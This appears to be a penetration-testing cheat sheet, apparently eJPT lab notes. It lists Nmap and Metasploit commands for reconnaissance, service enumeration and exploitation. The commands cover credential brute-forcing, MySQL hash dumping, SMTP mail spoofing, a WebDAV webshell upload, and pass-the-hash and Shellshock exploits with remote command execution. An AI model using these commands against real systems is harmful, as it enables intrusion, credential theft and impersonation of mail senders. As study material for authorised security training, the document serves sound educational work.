# Information Gathering & Enumeration

## Some Web Recon Tools
```bash
# Display a brief description of the domain or command functionality
whatis <domain>

# Perform a simple DNS lookup to find the IP address of a host
host <domain>

# (Browser Extension) Identify web technologies, CMS, and frameworks used by a site
wappalyzer

# Identify web technologies, version numbers, and scripts via command line
whatweb <domain>

# Mirror/clone an entire website to a local directory for offline analysis
httrack <url>

# Detect and identify the Web Application Firewall (WAF) protecting a site
wafw00f <domain>

# (Web Tool) Check if an email or username exists in known data breaches
haveibeenpwned.com

# Enumerate DNS records and attempt a Zone Transfer (AXFR) to find subdomains
dnsenum <domain>
```

## Enumeration with Nmap
```bash
# Scan a single target for the most common 1,000 ports
nmap <target>

# Scan all 65,535 ports (essential for eJPT to find hidden services)
nmap -p- <target>

# Detect service versions and operating system details
nmap -sV -O <target>

# Aggressive scan: combines OS detection, version detection, script scanning, and traceroute
nmap -A <target>

# Stealthy TCP SYN scan (standard way to scan without completing a full handshake)
nmap -sS <target>

# Scan for UDP services (slower, but necessary for DNS, SNMP, and DHCP)
nmap -sU <target>

# Run default NSE (Nmap Scripting Engine) scripts to check for vulnerabilities
nmap -sC <target>

# Save results in three formats (normal, XML, and grepable) for reporting
nmap -oA <filename> <target>

# Fast scan: limits scanning to only the top 100 most common ports
nmap -F <target>

# Disable ping discovery (useful if the target blocks ICMP/pings)
nmap -Pn <target>

# Advanced Nmap Scaning (Firewall/IDS Evasion)
nmap -sA <target> # Ack scan
nmap -sW <target> # Window scan
nmap -sM <target> # Maimon scan
nmap -sN <target> # NULL scan
nmap -sF <target> # FIN scan
nmap -sX <target> # Xmas scan

nmap -f <target> # packets fragmentation
nmap -f --mtu 8 <target> # fragment packets
nmap --data-length 200 <target> # Append random data to sent packets
nmap -D <target> # Cloak a scan with decoys
nmap -g 53 <target> # --source-port
```

## Importing Scans to MSF
```bash
nmap <target> -oX scan_file
service postgresql start
msfconsole -q
workspace -a workspace_name
db_import scan_file

# ---

hosts
services
vulns
```

## Service Enumeration

### FTP
```bash
nmap -sV -p21 <target>

# ---

msfconsole -q
use auxiliary/scanner/ftp/ftp_version
set RHOSTS <target>
run

# ---

use auxiliary/scanner/ftp/anonymous
set RHOSTS <target>
run

# ---

use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run
```

### SMB
```bash
ls -l /usr/share/nmap/scripts | grep smb
nmap --script smb-os-discovery.nse -p 445 <target>
nmblookup -A <target>
smbclient -L .//<target> -N
rpcclient -U "" -N <target>

# ---

msfconsole -q
use auxiliary/scanner/smb/smb_version
set RHOSTS <target>
exploit
```

### Apache
```bash
msfconsole -q
use auxiliary/scanner/http/http_version
set RHOSTS <target>
run

# ---

use auxiliary/scanner/http/robots_txt
set RHOSTS <target>
run

# ---

use auxiliary/scanner/http/http_header
set RHOSTS <target>
run

# ---

use auxiliary/scanner/http/http_header
set RHOSTS <target>
set TARGETURI /secure
run

# ---

use auxiliary/scanner/http/brute_dirs
set RHOSTS <target>
run

# ---

use auxiliary/scanner/http/dir_scanner
set RHOSTS <target>
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
run

# ---

use auxiliary/scanner/http/dir_listing
set RHOSTS <target>
set PATH /data
run

# ---

use auxiliary/scanner/http/files_dir
set RHOSTS <target>
set VERBOSE false
run

# ---

use auxiliary/scanner/http/http_put
set RHOSTS <target>
set PATH /data
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run

# ---

use auxiliary/scanner/http/http_put
set RHOSTS <target>
set PATH /data
set FILENAME test.txt
set ACTION DELETE
run

# ---

use auxiliary/scanner/http/http_login
set RHOSTS <target>
set AUTH_URI /secure/
set VERBOSE false
run

# ---

use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set RHOSTS <target>
set VERBOSE false
run
```

### MySQL
```bash
msfconsole -q
use auxiliary/scanner/mysql/mysql_version
set RHOSTS <target>
run

# ---

use auxiliary/scanner/mysql/mysql_login
set RHOSTS <target>
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

# ---

use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS <target>
run

# ---

use auxiliary/admin/mysql/mysql_sql
set USERNAME root
set PASSWORD twinkle
set RHOSTS <target>
run

# ---

use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD twinkle
set RHOSTS <target>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run

# ---

use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS <target>
run

# ---

use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD twinkle
set RHOSTS <target>
run

# ---

use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS <target>
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

### SSH
```bash
msfconsole
use auxiliary/scanner/ssh/ssh_version
set RHOSTS <target>
exploit

# ---

use auxiliary/scanner/ssh/ssh_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/common_passwords.txt
set STOP_ON_SUCCESS true
set VERBOSE true
exploit
```

### MySQL
```bash
nmap -sV -script banner <target>

# ---

nc <target> 25
VRFY admin@openmailbox.xyz

# ---

telnet <target> 25
HELO attacker.xyz
EHLO attacker.xyz

# ---

smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t <target>

# ---

msfconsole -q
use auxiliary/scanner/smtp/smtp_enum
set RHOSTS <target>
exploit

# ---

telnet <target> 25
HELO attacker.xyz
mail from: admin@attacker.xyz
rcpt to:root@openmailbox.xyz
data
Subject: Hi Root
Hello,
This is a fake mail sent using telnet command.
From,
Admin

# ---

sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s <target> -u Fakemail -m "Hi root, a fake from admin" -o tls=no
```

### IIS DAV
```bash
nmap --script http-enum -sV -p 80 <target>
davtest -url http://<target>/webdav
davtest -auth <user>:<pass> -url http://<target>/webdav
cadaver http://<target>/webdav
put /usr/share/webshells/asp/webshell.asp
```

## Vulnerability Analysis

### EternalBlue
```bash
nmap -sV -p445 --script=smb-vuln-ms17-010 <target>

# ---

msfconsole -q
search eternalblue
use auxiliary/scanner/smb/smb_ms17_010
set RHOSTS <target>
run
```

### BlueKeep
```bash
nmap -sV -p3389 <target>
msfconsole -q
search bluekeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <target>
run
```

### Pass-the-Hash Attacks
```bash
msfconsole -q
search psexec
use exploit/windows/smb/psexec
set RHOSTS <target>
set SMBUser Administrator
set SMBPass <Admin-hash>
set Target "Native upload"
exploit

# ---

crackmapexec smb <target> -u Administrator -p <hash> -x <cmd>
```

### Shellshock
```bash
nmap -sV --script http-shellshock <target>
nmap -sV --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls <target>

# ---

msfconsole -q
use exploit/multi/http/apache_mod_cgi_bash_env_exec
set RHOSTS <target>
set TARGETURI <vulnerable-uri>
set TARGET <target>
exploit
```

### Metasploit Used Modules
```bash
use exploit/unix/webapp/xoda_file_upload
set RHOSTS demo1.ine.local
set TARGETURI /
set LHOST 192.63.4.2
exploit

# ---

use auxiliary/scanner/ftp/ftp_login
set RHOSTS <target>
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
run

# ---

setg RHOSTS <target>
use auxiliary/scanner/http/http_version
use auxiliary/scanner/http/robots_txt
use auxiliary/scanner/http/http_header
use auxiliary/scanner/http/brute_dirs
use auxiliary/scanner/http/dir_scanner
set DICTIONARY /usr/share/metasploit-framework/data/wordlists/directory.txt
use auxiliary/scanner/http/files_dir

use auxiliary/scanner/http/http_put
set PATH /upload
set FILENAME test.txt
set FILEDATA "Welcome To AttackDefense"
run

use auxiliary/scanner/http/http_login
set AUTH_URI /secure/
set VERBOSE false
run

use auxiliary/scanner/http/apache_userdir_enum
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set VERBOSE false
run

# ---

use auxiliary/scanner/mysql/mysql_version
set RHOSTS <target>
run

use auxiliary/scanner/mysql/mysql_login
set USERNAME root
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run

use auxiliary/admin/mysql/mysql_enum
set USERNAME root
set PASSWORD pass123
set RHOSTS <target>
run

use auxiliary/scanner/mysql/mysql_file_enum
set USERNAME root
set PASSWORD pass123
set RHOSTS <target>
set FILE_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
set VERBOSE true
run

use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD pass123
set RHOSTS <target>
run

use auxiliary/scanner/mysql/mysql_schemadump
set USERNAME root
set PASSWORD pass123
set RHOSTS <target>
run

use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS <target>
set USERNAME root
set PASSWORD pass123
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```
